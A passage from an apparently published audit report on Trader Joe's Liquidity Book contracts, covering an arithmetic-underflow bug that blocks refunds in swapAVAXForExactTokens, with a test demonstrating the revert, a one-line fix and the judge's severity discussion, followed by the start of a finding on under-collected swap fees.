href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/191\">d3e4</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/115\">Rahoz</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/84\">8olidity</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/49\">cccz</a>, and <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/33\">vv7</a></em></p>\n<p>When calling the <code>swapAVAXForExactTokens</code>  function, <code>if (msg.value > amountsIn[0]) _safeTransferAVAX(_to, amountsIn[0] - msg.value)</code> is executed, which is for refunding any excess amount sent in; this is confirmed by this function’s comment as well. However, executing <code>amountsIn[0] - msg.value</code> will always revert when <code>msg.value > amountsIn[0]</code> is true. Developers who has the design of the <code>swapAVAXForExactTokens</code> function in mind could develop front-ends and contracts that will send excess amount when calling the <code>swapAVAXForExactTokens</code> function. Hence, the users, who rely on these front-ends and contracts for interacting with the <code>swapAVAXForExactTokens</code> function will always find such interactions being failed since calling this function with the excess amount will always revert. As a result, the user experience becomes degraded, and the usability of the protocol becomes limited.</p>\n<p><a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L485-L521\">https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L485-L521</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"44\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @notice Swaps AVAX for exact tokens while performing safety checks</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @dev will refund any excess sent</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">swapAVAXForExactTokens</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amountOut</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_pairBinSteps</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tokenPath</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_deadline</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">payable</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">override</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">ensure</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_deadline</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">verifyInputs</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pairBinSteps</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenPath</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountsIn</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">amountsIn</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]) </span><span class=\"mtk11\">_safeTransferAVAX</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amountsIn</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] - </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-10\" style=\"position:relative;\"><a href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Please add the following test in <code>test\\LBRouter.Swaps.t.sol</code>. This test will pass to demonstrate the described scenario.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"45\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testSwapAVAXForExactTokensIsUnableToRefund</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountOut</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\">, ) = </span><span class=\"mtk12\">router</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getSwapIn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pairWavax</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amountOut</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenList</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IERC20</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tokenList</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">wavax</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tokenList</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">token6D</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pairVersions</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">pairVersions</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">DEFAULT_BIN_STEP</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DEV</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">500</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Although the swapAVAXForExactTokens function supposes to refund any excess sent,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//   calling it reverts when sending more than amountIn</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//   because executing _safeTransferAVAX(_to, amountsIn[0] - msg.value) results in arithmetic underflow</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stdError</span><span class=\"mtk1\">.</span><span class=\"mtk12\">arithmeticError</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">router</span><span class=\"mtk1\">.</span><span class=\"mtk12\">swapAVAXForExactTokens</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">amountOut</span><span class=\"mtk1\">, </span><span class=\"mtk12\">pairVersions</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenList</span><span class=\"mtk1\">, </span><span class=\"mtk12\">DEV</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"tools-used-4\" style=\"position:relative;\"><a href=\"#tools-used-4\" aria-label=\"tools used 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p><a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L520\">https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L520</a> can be updated to the following code.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"46\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">amountsIn</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]) </span><span class=\"mtk11\">_safeTransferAVAX</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">amountsIn</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]);</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/469\">0x0Louis (Trader Joe) confirmed, but disagreed with severity</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/469#issuecomment-1312807502\">Alex the Entreprenerd (judge) decreased severity to Low and commented</a>:</strong></p>\n<blockquote>\n<p>The finding is valid, sending more than necessary will revert.<br>\nNo loss to end-users was shown, and the revert will prevent the tx from finishing.</p>\n<p>Because of that, considering the fact that a accurate measure could be calculated, meaning that functionality can be side-stepped, despite recommending fixing, I think the finding is QA - Low Severity as the revert is self-inflicted.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/469#issuecomment-1321260885\">Alex the Entreprenerd (judge) increased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Per discussion from backstage I’ve re-reviewed the finding.</p>\n<p>I have poked around with the test provided and tweaked it a little, this is the last one I have</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"47\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testSwapAVAXForExactTokensIsUnableToRefund</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountOut</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\">, ) = </span><span class=\"mtk12\">router</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getSwapIn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pairWavax</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amountOut</span><span class=\"mtk1\">, </span><span class=\"mtk4\">false</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenList</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IERC20</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tokenList</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">wavax</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">tokenList</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">token6D</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pairVersions</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">pairVersions</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">DEFAULT_BIN_STEP</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DEV</span><span class=\"mtk1\">, </span><span class=\"mtk7\">50</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">500</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Although the swapAVAXForExactTokens function supposes to refund any excess sent,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//   calling it reverts when sending more than amountIn</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//   because executing _safeTransferAVAX(_to, amountsIn[0] - msg.value) results in arithmetic underflow</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stdError</span><span class=\"mtk1\">.</span><span class=\"mtk12\">arithmeticError</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">router</span><span class=\"mtk1\">.</span><span class=\"mtk12\">swapAVAXForExactTokens</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">amountOut</span><span class=\"mtk1\">, </span><span class=\"mtk12\">pairVersions</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenList</span><span class=\"mtk1\">, </span><span class=\"mtk12\">DEV</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">router</span><span class=\"mtk1\">.</span><span class=\"mtk12\">swapAVAXForExactTokens</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">amountOut</span><span class=\"mtk1\">, </span><span class=\"mtk12\">pairVersions</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenList</span><span class=\"mtk1\">, </span><span class=\"mtk12\">DEV</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stdError</span><span class=\"mtk1\">.</span><span class=\"mtk12\">arithmeticError</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">router</span><span class=\"mtk1\">.</span><span class=\"mtk12\">swapAVAXForExactTokens</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">amountIn</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">100000</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">amountOut</span><span class=\"mtk1\">, </span><span class=\"mtk12\">pairVersions</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenList</span><span class=\"mtk1\">, </span><span class=\"mtk12\">DEV</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Ultimately we can conclude that any amount below <code>amountIn</code> will result in a revert due to insufficient amountOut, and any amount above <code>amountIn</code> will revert due to the highlighted overflow.</p>\n<p>The function is a routing function, which is meant to allow some degree of slippage.</p>\n<p>My original downgrade was based on the idea that the function can run, however, after it being flagged, I must agree that the availability of the function is impaired in the majority of ordinary cases (a <code>.10%</code> / <code>.5%</code> slippage is expected under most operations / FEs).</p>\n<p>For this reason, I agree with upgrading back to Medium Severity.</p>\n<p>I’d like to thank @shung and @hyh for their feedback.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-07-incorrect-fee-calculation-on-lbpair-fees-collected-on-swaps-are-less-than-what-they-should-be\" style=\"position:relative;\"><a href=\"#m-07-incorrect-fee-calculation-on-lbpair-fees-collected-on-swaps-are-less-than-what-they-should-be\" aria-label=\"m 07 incorrect fee calculation on lbpair fees collected on swaps are less than what they should be permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/470\">[M-07] Incorrect fee calculation on LBPair (fees collected on swaps are less than what they “should” be)</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/470\">sha256yan</a>, also found by <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/339\">Jeiwan</a></em></p>\n<p>LBPair contracts consistently collect less fees than their FeeParameters.</p>\n<h3 id=\"github-and-source-code\" style=\"position:relative;\"><a href=\"#github-and-source-code\" aria-label=\"github and source code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Github and source code</h3>\n<p><a href=\"https://github.com/sha256yan/incorrect-fee\">https://github.com/sha256yan/incorrect-fee</a></p>\n<h3 id=\"motivation-and-severity\" style=\"position:relative;\"><a href=\"#motivation-and-severity\" aria-label=\"motivation and severity permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Motivation and Severity</h3>\n<p><em>Note: please see warden’s <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/470\">original submission</a> for full details.</em></p>\n<p>LBpair contracts’ fees fall short by <code>0.1%</code> on single bin with the deficit growing exponentially with multi-bin swaps.</p>\n<p>This report will refer to this difference in fees, that is, the difference between the expected fees and the actual collected fees as the “Fee Deficit”.</p>\n<p><img src=\"https://user-images.githubusercontent.com/91401566/197405701-e6df80c4-dcdf-44f5-9fd2-74ef1c66b954.png\" alt=\"feeDeficitGrowth\"></p>\n<p>The exponential growth of the Fee Deficit percentage is concerning, considering that the vast majority of the fees collected\nby LPs and DEXs are during high volatility periods.<br>\nNote that the peak Fee Deficit percentage of <code>1.6%</code> means that <code>1.6%</code> of expected fees would not be collected.</p>\n<p>With an assumed average total fee of <code>1%</code> (higher than usual due to <code>variableFee</code> component) and average Fee Deficit percentage of <code>0.4%</code>;<br>\nThe total Fee Deficit from a period similar to May 7th 2022 - May 14th 2022, with approximately <code>$1.979B</code> in trading volume, would be <code>$79,160</code> over one week.</p>\n<p><a 